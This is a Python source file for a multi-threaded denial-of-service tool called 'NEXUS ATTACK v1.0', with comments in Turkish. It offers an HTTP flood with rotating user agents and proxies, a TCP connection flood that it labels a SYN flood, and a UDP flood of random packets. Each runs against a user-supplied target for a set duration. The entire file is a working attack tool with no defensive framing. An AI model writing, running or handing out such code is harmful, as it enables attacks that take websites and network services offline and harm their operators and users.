import threading
import socket
import random
import sys
import time
import requests
from urllib.parse import urlparse

# --- Genel Ayarlar ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"
]
proxies = []

# --- Katman 7 Saldırı Fonksiyonları ---
def load_proxies():
    """proxies.txt dosyasından proxy listesini yükler."""
    try:
        with open('proxies.txt', 'r') as f:
            proxies.extend(f.read().strip().split('\n'))
        if not proxies:
            print("[Warning] proxies.txt is empty or not found. Attack will continue without proxies.")
    except IOError:
        print("[Warning] proxies.txt not found. Attack will continue without proxies.")

def http_flood_attack(target_url, end_time):
    """Gelişmiş HTTP Flood saldırısı gerçekleştirir."""
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': f'https://www.google.com/search?q={random.randint(1, 1000)}',
                'Connection': 'keep-alive',
            }
            # URL'ye rastgele query parametresi ekle
            attack_url = f"{target_url}?{random.randint(1, 100000)}={random.randint(1, 100000)}"
            
            # Proxy kullan
            proxy = {'http': f'http://{random.choice(proxies)}', 'https': f'https://{random.choice(proxies)}'} if proxies else None
            
            requests.get(attack_url, headers=headers, timeout=5, proxies=proxy)
        except (requests.exceptions.RequestException, ConnectionError):
            pass

# --- Katman 4 Saldırı Fonksiyonları ---
def tcp_syn_flood(target_ip, target_port, end_time):
    """TCP SYN Flood saldırısı gerçekleştirir."""
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            # Bağlantıyı hemen kapatmadan yarım açık bırak
        except socket.error:
            pass
        finally:
            s.close()

def udp_flood(target_ip, target_port, end_time):
    """UDP Flood saldırısı gerçekleştirir."""
    packet_size = 1024 # 1 KB'lık paketler
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            packet = random._urandom(packet_size)
            udp_socket.sendto(packet, (target_ip, target_port))
        except socket.error:
            pass

# --- Ana Menü ve Yönetim ---
def main_menu():
    print("======================================")
    print("    NEXUS ATTACK v1.0 - Full Stack    ")
    print("======================================")
    print("1. Layer 7 (Application) Attacks")
    print("2. Layer 4 (Network) Attacks")
    print("--------------------------------------")
    choice = input("Your choice: ")

    if choice == '1':
        layer7_menu()
    elif choice == '2':
        layer4_menu()
    else:
        print("Invalid choice.")
        sys.exit()

def layer7_menu():
    print("\n--- Layer 7 Attacks ---")
    target_url = input("Target URL (e.g., http://example.com): ")
    if not urlparse(target_url).scheme:
        print("\nError: Please enter a valid URL.")
        return
    num_threads = int(input("Number of Threads (e.g., 500): "))
    attack_duration = int(input("Attack Duration (seconds): "))
    
    load_proxies()
    
    print("\n[L7] Starting HTTP Flood attack...")
    run_attack(http_flood_attack, (target_url, time.time() + attack_duration), num_threads, attack_duration)

def layer4_menu():
    print("\n--- Layer 4 Attacks ---")
    print("1. TCP SYN Flood")
    print("2. UDP Flood")
    choice = input("Attack Method: ")
    
    target_ip = input("Target IP Address: ")
    target_port = int(input("Target Port: "))
    num_threads = int(input("Number of Threads (e.g., 500): "))
    attack_duration = int(input("Attack Duration (seconds): "))
    
    end_time = time.time() + attack_duration
    if choice == '1':
        print("\n[L4] Starting TCP SYN Flood attack...")
        run_attack(tcp_syn_flood, (target_ip, target_port, end_time), num_threads, attack_duration)
    elif choice == '2':
        print("\n[L4] Starting UDP Flood attack...")
        run_attack(udp_flood, (target_ip, target_port, end_time), num_threads, attack_duration)
    else:
        print("Invalid choice.")

def run_attack(attack_func, args, num_threads, attack_duration):
    print(f"Target: {args[0]}")
    print(f"Threads: {num_threads}")
    print(f"Duration: {attack_duration} seconds")
    print("--------------------------------------")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_func, args=args)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    time.sleep(attack_duration)
    print("\nAttack finished.")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        sys.exit()
    except (ValueError, IndexError):
        print("\nError: Please enter a valid value.")
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")
